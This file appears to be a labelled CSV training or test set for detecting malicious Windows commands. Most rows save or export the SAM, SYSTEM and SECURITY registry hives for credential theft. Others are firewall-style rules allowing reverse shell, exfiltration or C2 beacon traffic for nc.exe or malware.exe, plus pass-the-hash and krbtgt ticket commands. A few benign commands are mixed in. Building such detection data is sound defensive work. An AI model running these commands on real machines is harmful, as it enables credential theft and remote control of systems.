text,label
"powershell -nop -c ""reg save hklm\security c:\windows\temp\iik56mbb.save""",1
reg export hklm\system c:\windows\temp\yzh1h6bd.save,1
reg export hklm\sam c:\windows\temp\adwaut8l.save,1
reg export hklm\system c:\windows\temp\j49i0y2b.save,1
reg export hklm\security c:\windows\temp\qpam9xub.save,1
reg export hklm\security c:\windows\temp\yijpa3ju.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg save hklm\system c:\windows\temp\fjtjbf7o.save,1
set-mppreference  -disablerealtimemonitoring  $true,2
reg export hklm\sam c:\windows\temp\hs8zfl5m.save,1
reg save hklm\system c:\windows\temp\4ec64i29.save,1
reg save hklm\sam c:\windows\temp\mnwc6krr.save,1
reg save hklm\sam c:\windows\temp\2qyeqcw3.save,1
reg export hklm\sam c:\windows\temp\z07bf2to.save,1
reg save hklm\system c:\windows\temp\9ceou3qc.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\ht60c1m2.save""",1
reg save hklm\system c:\windows\temp\891c1pr9.save,1
reg export hklm\security c:\windows\temp\o7riav72.save,1
reg save hklm\security c:\windows\temp\pdjuydy2.save,1
reg save hklm\sam c:\windows\temp\ctfbndj1.save,1
reg save hklm\sam c:\windows\temp\n7fwp87y.save,1
reg save hklm\system c:\windows\temp\frmt28gq.save,1
reg save hklm\security c:\windows\temp\kwkfqgkb.save,1
reg save hklm\sam c:\windows\temp\p0s19kxl.save,1
reg save hklm\security c:\windows\temp\3yjp25d9.save,1
reg save hklm\system c:\windows\temp\dxpr3srk.save,1
reg save hklm\sam c:\windows\temp\uakvlszw.save,1
reg export hklm\sam c:\windows\temp\lr624aaf.save,1
reg save hklm\security c:\windows\temp\n0115wuc.save,1
reg save hklm\sam c:\windows\temp\5tjnf0yz.save,1
reg export hklm\sam c:\windows\temp\xww98a6e.save,1
reg export hklm\security c:\windows\temp\j7xdewjr.save,1
rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg export hklm\sam c:\windows\temp\5fv6qms7.save,1
reg save hklm\sam c:\windows\temp\bnhmcp0t.save,1
reg export hklm\security c:\windows\temp\vdq4o0av.save,1
reg export hklm\sam c:\windows\temp\gw7r60jz.save,1
"cmd.exe /c ""explorer.exe""",0
reg save hklm\sam c:\windows\temp\w081k0lb.save,1
reg   export   hklm\sam   c:\windows\temp\jh09v8wd.save,1
reg export hklm\system c:\windows\temp\5nnta6eh.save,1
reg save hklm\sam c:\windows\temp\hczfk4wt.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\r8il7h5o.save""",1
reg save hklm\security c:\windows\temp\vwhy0vpu.save,1
reg export hklm\system c:\windows\temp\9dt6m3y0.save,1
reg save hklm\system c:\windows\temp\a1eryobw.save,1
reg save hklm\system c:\windows\temp\jbng88tv.save,1
reg export hklm\system c:\windows\temp\n9tdmk7w.save,1
reg export hklm\security c:\windows\temp\vwoflf07.save,1
reg save hklm\security c:\windows\temp\shhnddlo.save,1
reg save hklm\sam c:\windows\temp\li491dd7.save,1
reg export hklm\sam c:\windows\temp\6kufpr6c.save,1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 1337""",2
reg export hklm\security c:\windows\temp\yhi0bhea.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
reg export hklm\security c:\windows\temp\owpqpdg7.save,1
reg save hklm\sam c:\windows\temp\6asdalva.save,1
reg save hklm\system c:\windows\temp\lxqs7uih.save,1
reg save hklm\security c:\windows\temp\pf88usr7.save,1
reg save hklm\sam c:\windows\temp\1eqdem1r.save,1
reg export hklm\system c:\windows\temp\s1s8dlf3.save,1
reg export hklm\system c:\windows\temp\457l5q8s.save,1
reg save hklm\system c:\windows\temp\edwz942x.save,1
reg save hklm\security c:\windows\temp\r0pya0be.save,1
reg export hklm\system c:\windows\temp\5po1s9z2.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\6l2haglo.save""",1
reg save hklm\security c:\windows\temp\3ugdeyos.save,1
reg save hklm\system c:\windows\temp\u8pb5sts.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\system c:\windows\temp\c8fyd2bu.save,1
reg export hklm\system c:\windows\temp\l6mgbz55.save,1
reg export hklm\sam c:\windows\temp\e9n4iwwo.save,1
reg save hklm\sam c:\windows\temp\v5tb834r.save,1
reg export hklm\security c:\windows\temp\7543cwwg.save,1
reg save hklm\security c:\windows\temp\6c7bm3aa.save,1
reg export hklm\security c:\windows\temp\z4daux91.save,1
reg export hklm\security c:\windows\temp\22ccixmv.save,1
reg save hklm\security c:\windows\temp\e41fyydl.save,1
reg save hklm\security c:\windows\temp\4h25vo02.save,1
reg export hklm\sam c:\windows\temp\oomctv68.save,1
reg export hklm\sam c:\windows\temp\xjklpqnn.save,1
rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg save hklm\security c:\windows\temp\ybligszz.save,1
reg export hklm\security c:\windows\temp\ij6draiz.save,1
reg export hklm\security c:\windows\temp\10v3d7zl.save,1
reg export hklm\sam c:\windows\temp\6kauqm81.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""reg save hklm\security c:\windows\temp\h2weeax8.save""",1
reg export hklm\security c:\windows\temp\4odhj23c.save,1
reg save hklm\system c:\windows\temp\4fo0obo2.save,1
reg export hklm\system c:\windows\temp\ekdru4t4.save,1
rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
reg export hklm\sam c:\windows\temp\4r9bnbrx.save,1
reg export hklm\system c:\windows\temp\oc4l7f02.save,1
reg save hklm\system c:\windows\temp\03ae3f0a.save,1
reg  save  hklm\system  c:\windows\temp\83fnlcn6.save,1
reg save hklm\system c:\windows\temp\0d4fm9hq.save,1
reg save hklm\security c:\windows\temp\5w6frneo.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\sam c:\windows\temp\l7v7s1uz.save,1
reg export hklm\system c:\windows\temp\m8picmtl.save,1
reg save hklm\sam c:\windows\temp\ecubc7hz.save,1
reg export hklm\sam c:\windows\temp\hx5nxqtc.save,1
reg save hklm\system c:\windows\temp\978ayvo3.save,1
reg export hklm\sam c:\windows\temp\jfvt2hgd.save,1
reg save hklm\security c:\windows\temp\hynehmbu.save,1
reg export hklm\system c:\windows\temp\or4k2v3u.save,1
reg save hklm\security c:\windows\temp\x41a4x5w.save,1
$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex'),3
reg export hklm\system c:\windows\temp\7cwy9yl2.save,1
reg save hklm\sam c:\windows\temp\c3hlxruo.save,1
reg export hklm\system c:\windows\temp\pvieksrf.save,1
reg export hklm\security c:\windows\temp\odz61j0e.save,1
reg export hklm\system c:\windows\temp\jdxbshmx.save,1
reg save hklm\system c:\windows\temp\i4807z7h.save,1
reg save hklm\system c:\windows\temp\tw4fc5l0.save,1
reg export hklm\system c:\windows\temp\2x5r06te.save,1
reg save hklm\security c:\windows\temp\e5m06shj.save,1
reg save hklm\security c:\windows\temp\ta9jy64x.save,1
reg export hklm\sam c:\windows\temp\lk68xg7j.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\e5qdyk5e.save""",1
reg export hklm\sam c:\windows\temp\k8jig4uv.save,1
reg save hklm\security c:\windows\temp\0vcq1uf1.save,1
reg export hklm\system c:\windows\temp\1fjg4lmy.save,1
reg save hklm\sam c:\windows\temp\yeppkif3.save,1
reg export hklm\system c:\windows\temp\zh3v2drh.save,1
reg export hklm\system c:\windows\temp\4bg0nloq.save,1
reg   export   hklm\sam   c:\windows\temp\daxb5wcu.save,1
reg export hklm\sam c:\windows\temp\fhu1ol34.save,1
reg export hklm\security c:\windows\temp\raf0hqki.save,1
reg save hklm\sam c:\windows\temp\4r2308df.save,1
reg export hklm\security c:\windows\temp\fxbm4i4r.save,1
reg export hklm\system c:\windows\temp\37vb9155.save,1
reg export hklm\system c:\windows\temp\nifqnkdt.save,1
reg export hklm\system c:\windows\temp\wv2c5upl.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\sam c:\windows\temp\3rgybzb7.save,1
reg save hklm\security c:\windows\temp\l48uf5zc.save,1
"powershell -nop -c ""backup-utility   write   hklm\software   to   c:\backups\config.dat""",0
reg save hklm\sam c:\windows\temp\eofbej7w.save,1
reg save hklm\system c:\windows\temp\ox2kpqtv.save,1
reg save hklm\sam c:\windows\temp\ltoax880.save,1
reg export hklm\security c:\windows\temp\kwpgklf3.save,1
reg export hklm\security c:\windows\temp\nwaqrvm0.save,1
reg export hklm\security c:\windows\temp\gbkw4w4n.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\security c:\windows\temp\1emo4jqj.save,1
rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444,2
reg save hklm\sam c:\windows\temp\i8yvn51z.save,1
reg export hklm\system c:\windows\temp\haa53l60.save,1
reg save hklm\sam c:\windows\temp\edaqlc65.save,1
reg export hklm\security c:\windows\temp\m17877hv.save,1
reg export hklm\security c:\windows\temp\0y7mjjtq.save,1
reg save hklm\system c:\windows\temp\ezw697iu.save,1
reg save hklm\sam c:\windows\temp\hjbr5e9g.save,1
reg save hklm\system c:\windows\temp\dce01gmc.save,1
reg save hklm\security c:\windows\temp\fw999p8w.save,1
reg export hklm\sam c:\windows\temp\2876qr9u.save,1
reg save hklm\sam c:\windows\temp\9rjska2s.save,1
reg export hklm\security c:\windows\temp\b4ey3ogq.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\dif1b1l7.save""",1
reg export hklm\system c:\windows\temp\82968tbe.save,1
reg export hklm\sam c:\windows\temp\z2cm36lh.save,1
reg export hklm\sam c:\windows\temp\y9jw166h.save,1
reg export hklm\security c:\windows\temp\qkdo33u7.save,1
rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337,2
reg  export  hklm\security  c:\windows\temp\phr0c2q6.save,1
reg save hklm\sam c:\windows\temp\w9df00x3.save,1
reg export hklm\system c:\windows\temp\j4u7z2l5.save,1
reg export hklm\sam c:\windows\temp\umszv5ev.save,1
reg save hklm\sam c:\windows\temp\8ehy2pk8.save,1
reg export hklm\security c:\windows\temp\on3u5pvm.save,1
reg export hklm\sam c:\windows\temp\ayf4bsts.save,1
reg save hklm\sam c:\windows\temp\u62jf9o5.save,1
reg save hklm\sam c:\windows\temp\c6h9g97w.save,1
reg save hklm\system c:\windows\temp\dpujd3u7.save,1
reg save hklm\security c:\windows\temp\di072gbq.save,1
reg export hklm\security c:\windows\temp\dtjjogq5.save,1
reg export hklm\security c:\windows\temp\vrodq73f.save,1
reg export hklm\security c:\windows\temp\aa4o1viy.save,1
reg save hklm\sam c:\windows\temp\kq0vddny.save,1
reg save hklm\sam c:\windows\temp\nsn0ijbu.save,1
reg save hklm\security c:\windows\temp\udbfamyl.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\n8ksyd48.save""",1
reg save hklm\sam c:\windows\temp\oxe62je9.save,1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\s.dat""""",1
"cmd.exe /c ""sekurlsa::pth""",3
reg save hklm\system c:\windows\temp\hts45nhv.save,1
reg export hklm\sam c:\windows\temp\6m7ki8ah.save,1
reg export hklm\sam c:\windows\temp\8h639e4g.save,1
reg export hklm\system c:\windows\temp\hmdobua6.save,1
reg export hklm\system c:\windows\temp\seqrjn33.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\fi7vt1qp.save""",1
reg export hklm\system c:\windows\temp\pexkx13c.save,1
reg save hklm\sam c:\windows\temp\moli4t6v.save,1
reg export hklm\security c:\windows\temp\da8jf4h3.save,1
reg save hklm\system c:\windows\temp\bi01itrv.save,1
klist get krbtgt/domain.local,3
reg save hklm\sam c:\windows\temp\hf6a30e1.save,1
reg export hklm\sam c:\windows\temp\r6m04uw4.save,1
reg save hklm\security c:\windows\temp\nceekipx.save,1
reg save hklm\security c:\windows\temp\12l28i0s.save,1
start cmd.exe /c whoami,0
reg save hklm\system c:\windows\temp\vr8ucqlc.save,1
reg save hklm\security c:\windows\temp\arapjxnv.save,1
reg export hklm\security c:\windows\temp\uizdclpf.save,1
reg save hklm\security c:\windows\temp\vdy47yt9.save,1
reg save hklm\security c:\windows\temp\h2qw4m2h.save,1
reg export hklm\security c:\windows\temp\48320b88.save,1
reg save hklm\sam c:\windows\temp\w12rvfjn.save,1
reg save hklm\sam c:\windows\temp\fg8ch377.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\gwz2wcja.save""",1
reg export hklm\system c:\windows\temp\hprb5gxv.save,1
reg save hklm\system c:\windows\temp\99u5k3py.save,1
"powershell -nop -c ""get-help   adjusttokenprivileges   -full""",0
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg save hklm\system c:\windows\temp\c80rp6if.save,1
reg save hklm\sam c:\windows\temp\fm3866mx.save,1
reg save hklm\security c:\windows\temp\o5lajj3o.save,1
reg export hklm\sam c:\windows\temp\ppr4jpjv.save,1
reg save hklm\security c:\windows\temp\rovmy6y3.save,1
reg export hklm\security c:\windows\temp\wtg42f3b.save,1
reg save hklm\security c:\windows\temp\nf4qsqiz.save,1
reg export hklm\sam c:\windows\temp\j401tav9.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\yt9onwr7.save""",1
reg save hklm\sam c:\windows\temp\obkjh5nj.save,1
reg export hklm\security c:\windows\temp\qcpejvyo.save,1
reg save hklm\security c:\windows\temp\tgh0aqk0.save,1
reg export hklm\sam c:\windows\temp\pvqfcheq.save,1
reg save hklm\system c:\windows\temp\kjuh6iqv.save,1
reg export hklm\sam c:\windows\temp\zoayveup.save,1
reg export hklm\sam c:\windows\temp\bt9j9zd6.save,1
reg export hklm\security c:\windows\temp\k5ltwhg8.save,1
reg save hklm\security c:\windows\temp\77dk5qjf.save,1
reg export hklm\system c:\windows\temp\jrglovtj.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\gr3vwxau.save""",1
"cmd.exe /c ""tasklist  /v""",0
reg save hklm\system c:\windows\temp\rlkbi94v.save,1
reg save hklm\sam c:\windows\temp\s9v7h1o0.save,1
reg export hklm\sam c:\windows\temp\w5dzii0v.save,1
reg save hklm\system c:\windows\temp\da43111q.save,1
reg save hklm\security c:\windows\temp\4pobratc.save,1
reg export hklm\sam c:\windows\temp\wk5jqxks.save,1
reg export hklm\system c:\windows\temp\mjzl5c4l.save,1
reg save hklm\sam c:\windows\temp\u8vhex6w.save,1
reg export hklm\system c:\windows\temp\okr8k6ty.save,1
reg save hklm\security c:\windows\temp\hj5mfk79.save,1
reg save hklm\system c:\windows\temp\rl5vgv0c.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\system c:\windows\temp\pz6r7lbm.save,1
reg export hklm\security c:\windows\temp\quao5o8c.save,1
reg save hklm\security c:\windows\temp\865ea3b6.save,1
reg export hklm\security c:\windows\temp\f6ujc5u4.save,1
reg save hklm\security c:\windows\temp\xq42dslf.save,1
reg export hklm\system c:\windows\temp\sckosaeo.save,1
reg export hklm\sam c:\windows\temp\lyo1mu8l.save,1
reg save hklm\sam c:\windows\temp\3kad2lwt.save,1
reg save hklm\system c:\windows\temp\1rn86qri.save,1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\3qhcrirh.save""",1
"cmd.exe /c ""runas /user:administrator cmd.exe""",3
reg export hklm\security c:\windows\temp\lsw9pvfq.save,1
reg save hklm\system c:\windows\temp\quhbcxzz.save,1
reg export hklm\system c:\windows\temp\xvpm4it8.save,1
reg export hklm\security c:\windows\temp\96s0uwpb.save,1
reg save hklm\system c:\windows\temp\tmadkcs6.save,1
rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg export hklm\sam c:\windows\temp\1ccfvy1d.save,1
reg export hklm\security c:\windows\temp\zk04z16l.save,1
reg export hklm\sam c:\windows\temp\egu0ut8g.save,1
reg save hklm\security c:\windows\temp\f6d7ie6c.save,1
reg save hklm\sam c:\windows\temp\ew4n2qmf.save,1
reg save hklm\security c:\windows\temp\wud3ri0x.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\9uqqvs1w.save""",1
reg save hklm\security c:\windows\temp\6fo4uloy.save,1
reg save hklm\sam c:\windows\temp\dg8b78ru.save,1
reg save hklm\sam c:\windows\temp\fic7yw62.save,1
reg save hklm\security c:\windows\temp\ojshcr7d.save,1
reg save hklm\system c:\windows\temp\y3758n35.save,1
reg export hklm\security c:\windows\temp\hh33gqer.save,1
tasklist   /v,0
reg export hklm\system c:\windows\temp\3i9oe87k.save,1
reg save hklm\system c:\windows\temp\cpamms61.save,1
reg save hklm\sam c:\windows\temp\v5g9flbn.save,1
reg save hklm\security c:\windows\temp\xos0fjzf.save,1
reg save hklm\system c:\windows\temp\c842jevl.save,1
reg export hklm\system c:\windows\temp\pw0r68lq.save,1
reg export hklm\system c:\windows\temp\0p6n7fe1.save,1
reg save hklm\sam c:\windows\temp\6eghx1fx.save,1
reg export hklm\sam c:\windows\temp\wzg99jth.save,1
reg save hklm\sam c:\windows\temp\u6nkjqxd.save,1
reg save hklm\system c:\windows\temp\oxysuyg9.save,1
reg export hklm\security c:\windows\temp\kra5qmh4.save,1
reg save hklm\sam c:\windows\temp\e7ii6tpz.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\6iuofnc2.save""",1
reg export hklm\security c:\windows\temp\znqvwc1t.save,1
reg export hklm\sam c:\windows\temp\s86y9s1b.save,1
reg save hklm\security c:\windows\temp\zap9tip3.save,1
reg export hklm\system c:\windows\temp\gof99qyu.save,1
reg save hklm\security c:\windows\temp\m6gvbay1.save,1
reg  export  hklm\sam  c:\windows\temp\burpu05a.save,1
reg export hklm\system c:\windows\temp\j67yqix8.save,1
"cmd.exe /c ""node  server.js  --port  3000""",0
reg save hklm\security c:\windows\temp\3b122dv8.save,1
reg save hklm\system c:\windows\temp\wznj69s6.save,1
reg export hklm\system c:\windows\temp\rnk7lsaz.save,1
reg export hklm\system c:\windows\temp\jb321wwk.save,1
reg export hklm\system c:\windows\temp\1et01niv.save,1
reg save hklm\system c:\windows\temp\npts4h8e.save,1
reg save hklm\system c:\windows\temp\s0ivxdua.save,1
reg save hklm\sam c:\windows\temp\i9yeenq8.save,1
reg save hklm\security c:\windows\temp\f726h1mr.save,1
reg export hklm\sam c:\windows\temp\q45ilb07.save,1
reg save hklm\system c:\windows\temp\bqd7536z.save,1
reg export hklm\security c:\windows\temp\0xn24wow.save,1
reg export hklm\security c:\windows\temp\mhxtiqta.save,1
reg save hklm\sam c:\windows\temp\fj53u02r.save,1
reg save hklm\sam c:\windows\temp\7xf44o60.save,1
reg export hklm\system c:\windows\temp\w52olke2.save,1
reg export hklm\sam c:\windows\temp\rlxgh1p3.save,1
reg save hklm\system c:\windows\temp\ulc5fukm.save,1
reg export hklm\system c:\windows\temp\cfal02yp.save,1
reg save hklm\sam c:\windows\temp\gp7fx5yz.save,1
reg export hklm\sam c:\windows\temp\73epp2pf.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\ellsix4r.save""",1
reg export hklm\sam c:\windows\temp\sl1174ly.save,1
"cmd.exe /c ""ipconfig /all""",0
reg save hklm\security c:\windows\temp\2fxdj3xk.save,1
reg save hklm\system c:\windows\temp\rnbvf7xp.save,1
reg save hklm\sam c:\windows\temp\36rehdfn.save,1
reg export hklm\security c:\windows\temp\9f4jm3a1.save,1
reg   save   hklm\security   c:\windows\temp\q8isa72b.save,1
reg export hklm\security c:\windows\temp\wnksrkg8.save,1
reg save hklm\sam c:\windows\temp\qva0jhc8.save,1
reg export hklm\sam c:\windows\temp\ena6utbe.save,1
reg save hklm\sam c:\windows\temp\uceio0gg.save,1
reg export hklm\security c:\windows\temp\252alipg.save,1
reg save hklm\system c:\windows\temp\6xvhodfx.save,1
reg save hklm\system c:\windows\temp\8wvtmi23.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\sam c:\windows\temp\38a1ns56.save,1
reg save hklm\sam c:\windows\temp\uz67bjgq.save,1
reg export hklm\security c:\windows\temp\do5rx0o6.save,1
reg export hklm\security c:\windows\temp\zqoat2qa.save,1
reg save hklm\security c:\windows\temp\zyx977vc.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\3ks10t99.save""",1
reg export hklm\system c:\windows\temp\7t001088.save,1
reg export hklm\sam c:\windows\temp\s0rkiupk.save,1
reg   save   hklm\sam   c:\windows\temp\m2zx6k96.save,1
reg export hklm\sam c:\windows\temp\khdrmhu2.save,1
reg save hklm\system c:\windows\temp\5z7yu3sj.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg save hklm\security c:\windows\temp\1q9yqcgi.save,1
reg export hklm\system c:\windows\temp\m16ymtgw.save,1
reg save hklm\system c:\windows\temp\6gj6hf1r.save,1
reg export hklm\sam c:\windows\temp\j17dw6qf.save,1
rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg save hklm\security c:\windows\temp\3ipigdde.save,1
reg save hklm\sam c:\windows\temp\mk6h9gdz.save,1
reg export hklm\sam c:\windows\temp\zkgqw7h1.save,1
reg export hklm\security c:\windows\temp\mgqvmtuw.save,1
"powershell -nop -c ""whoami  /groups""",0
reg save hklm\security c:\windows\temp\yt8yudf7.save,1
reg export hklm\system c:\windows\temp\wojyaebi.save,1
reg export hklm\system c:\windows\temp\jiq4fqd4.save,1
reg export hklm\sam c:\windows\temp\vu51mwtp.save,1
reg save hklm\security c:\windows\temp\d8y1j1tp.save,1
reg save hklm\system c:\windows\temp\870bahak.save,1
reg save hklm\security c:\windows\temp\7kmlvs85.save,1
"powershell -nop -c ""get-registry-value -path hklm\sam\domains""",0
rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg export hklm\security c:\windows\temp\38iezn8p.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\4j4qd94d.save""",1
reg export hklm\security c:\windows\temp\546oyefr.save,1
reg export hklm\system c:\windows\temp\l23dax6u.save,1
rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888,2
